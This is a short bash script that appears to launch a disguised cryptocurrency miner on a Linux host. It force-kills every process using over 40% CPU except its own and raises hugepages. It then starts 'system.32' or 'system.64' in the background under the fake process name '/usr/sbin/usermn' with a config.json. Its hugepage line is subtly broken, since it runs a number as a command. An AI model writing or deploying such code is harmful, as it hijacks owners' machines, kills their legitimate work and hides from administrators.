#!/bin/bash
ps aux | grep -vw usermn | awk '{if($3>40.0) print $2}' | while read procid
do
kill -9 $procid
done

#ps -fe|grep -w usermn  |grep -v grep
#if [ $? -eq 0 ]
#then

proc=`grep -c ^processor /proc/cpuinfo`
cores=$((($proc+1)/2))

num=$(($cores*3))

/sbin/sysctl -w vm.nr_hugepages=`$num` >/dev/null 2>&1
if [ "$ARCH" == "i686" ];       then
nohup ./system.32 -s "/usr/sbin/usermn"  ./system.usermn -c config.json -t `echo $cores` >/dev/null &
elif [ "$ARCH" == "x86_64" ];   then
nohup ./system.64 -s "/usr/sbin/usermn"  ./system.usermn -c config.json -t `echo $cores` >/dev/null &
                                else
nohup ./system.64 -s "/usr/sbin/usermn"  ./system.usermn -c config.json -t `echo $cores` >/dev/null &
fi
rm -rf system.pid
echo `ps ax |grep usermn |grep -v grep|awk '{print $1;}'` > system.pid
